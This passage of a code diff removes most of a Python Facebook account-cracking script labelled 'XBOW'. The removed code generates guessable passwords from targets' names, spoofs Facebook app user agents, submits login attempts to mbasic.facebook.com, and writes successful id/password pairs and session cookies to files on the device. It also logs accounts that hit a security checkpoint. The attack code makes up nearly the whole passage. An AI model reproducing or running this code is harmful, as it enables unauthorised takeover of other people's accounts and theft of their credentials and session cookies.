-                                        sys.stdout.write('\r\r\033[1;31m [XBOW-M3] %s|\033[1;31mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
-                        elif 'www.facebook.com' in po['error']['message']:
-                                        if 'y' in pcp:
-                                                print('\r\r\x1b[38;5;205m [XBOW-CP] '+ids+' | '+pas+'\033[1;97m')
-                                                open('/sdcard/XBOW-CP.txt','a').write(ids+'|'+pas+'\n')
-                                                break
-                                                cps.append(ids)
-                                        else:
-                                                open('/sdcard/XBOW-CP.txt','a').write(ids+'|'+pas+'\n')
-                                                break
-                                                cps.append(ids)
-                        else:
-                                        continue
-                loop+=1
-        except requests.exceptions.ConnectionError:
-            time.sleep(20)
-        except Exception as e:
-                pass
-
-
-def api2(ids,names,passlist):
-        global loop,oks,cps
-        sys.stdout.write('\r\r\033[1;37m [XBOW-M1] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
-        session = requests.Session()
-        try:
-                first = names.split(' ')[0]
-                try:
-                        last = names.split(' ')[1]
-                except:
-                        last = 'Khan'
-                ps = first.lower()
-                ps2 = last.lower()
-                for fikr in passlist:
-                        pas = fikr.replace('First',first).replace('Last',last).replace('first',ps).replace('last',ps2)
-                        ua  =  "[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77)) +";FBBV/"+str(random.randint(1111111,7777777))+";[FBAN/Orca-Android;FBAV/14.0.0.20.69;FBBV/12945441;FBDM/{density=3.4,width=480,height=800};FBLC/dz_BT;FBCR/GLOMOBILE;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.orca;FBDV/G3502I;FBSV/4.3;nullFBCA/armeabi-v7a:armeabi;]"
-                        head = {'Host': 'mbasic.facebook.com', 'viewport-width': '980', 'sec-ch-ua': '" Not A;Brand";v="24", "Chromium";v="116", "Google Chrome";v="116"', 'sec-ch-ua-mobile': '?1', 'sec-ch-ua-platform': 'Android', 'sec-ch-prefers-color-scheme': 'light', 'dnt': '1', 'upgrade-insecure-requests': '1', 'user-agent': uaa(), 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'sec-fetch-site': 'none', 'sec-fetch-mode': 'navigate', 'sec-fetch-user': '?1', 'sec-fetch-dest': 'document', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'en-US,en;q=0.9'}
-                        getlog = session.get(f'https://mbasic.facebook.com/login/device-based/password/?uid={ids}&flow=login_no_pin&refsrc=deprecated&_rdr')
-                        idpass ={"lsd":re.search('name="lsd" value="(.*?)"', str(getlog.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(getlog.text)).group(1),"uid":ids,"next":"https://free.facebook.com/login/save-device/","flow":"login_no_pin","pass":pas,}
-                        complete = session.post('https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0',data=idpass,allow_redirects=False,headers=head)
-                        Aking=session.cookies.get_dict().keys()
-                        if "c_user" in Aking:
-                                coki=session.cookies.get_dict()
-                                kuki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
-                                print('\r\r\033[1;32m [XBOW-OK] %s | %s'%(ids,pas))
-                                open('/sdcard/XBOW-file-OK.txt', 'a').write(ids+'|'+pas+'\n')
-                                open('/sdcard/XBOW-file-coki-OK.txt', 'a').write(ids+' | '+pas+' | '+kuki+'\n')
-                                oks.append(ids)
-                                break
-                        elif 'checkpoint' in Aking:
-                                if 'y' in pcp:
-                                        ##########print('\r\r\x1b[38;5;208m [ZAIN-CP] '+ids+' | '+pas+'\033[1;97m')
-                                        open('/sdcard/XBOW-file-CP.txt', 'a').write(ids+'|'+pas+'\n')
-                                        cps.append(ids)
-                                        break
-                                else:
-                                        break
-                        else:
-                                continue
-        except requests.exceptions.ConnectionError:
-                time.sleep(20)
-        except Exception as e:pass
-        loop+=1
-
-
-
-try:
-	menu()
-except requests.exceptions.ConnectionError:
-	print('\n No internet connection ...')
-	exit()
-except:exit()
+menu()
